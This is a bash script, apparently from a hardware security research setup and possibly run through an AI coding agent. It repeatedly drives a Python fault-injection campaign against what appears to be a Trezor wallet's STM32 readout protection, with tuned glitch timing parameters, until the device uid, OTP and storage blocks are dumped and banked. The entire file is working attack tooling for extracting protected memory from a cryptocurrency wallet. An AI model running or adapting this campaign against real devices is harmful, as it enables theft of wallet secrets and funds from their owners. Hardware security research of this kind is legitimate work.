#!/bin/bash
# Targeted run: resume the storage head from accum, glitch for the remaining
# TARGETED pieces (uid + otp3 - storage_0000..0004 already banked). Stops when
# uid + otp3 are recovered. Demonstrates the real-device ~5-target attack.
set -u
cd /home/tdaly/trezor-btc/storage-sim
LOG=/tmp/opencode/targeted_loop.log
ACCUM=dumps/accum
while true; do
  if [ -f "$ACCUM/uid.bin" ] && [ -f "$ACCUM/otp3.bin" ]; then
    echo "=== *** uid + otp3 RECOVERED via glitch — targeted set complete ***" | tee -a "$LOG"; break
  fi
  echo "=== TARGETED run  (have uid:$([ -f $ACCUM/uid.bin ]&&echo y||echo n) otp3:$([ -f $ACCUM/otp3.bin ]&&echo y||echo n))  $(date '+%H:%M:%S') ===" | tee -a "$LOG"
  G_CLKGEN=166666667 G_OFFSET=-45 G_WIDTH=5 G_US_MIN=180.3 G_US_MAX=181.4 G_US_STEP=0.006 \
  G_RND_LO=33 G_RND_HI=45 G_SAMPLES=3 G_COOLDOWN=0.15 G_RESET_EVERY=1 \
  G_PASSES=200 G_SHOTS=2000000 G_RESUME="$ACCUM" G_TAG=targeted \
  /home/tdaly/.cwvenv/bin/python -u rdp1_glitch_campaign_full_mem_dump.py 2>&1 | tee -a "$LOG"
  for d in dumps/run_*; do for f in "$d"/*.bin; do case "$f" in *.bad.bin) continue;; esac; [ -f "$f" ] && cp -n "$f" "$ACCUM/" 2>/dev/null; done; done
  sleep 3
done
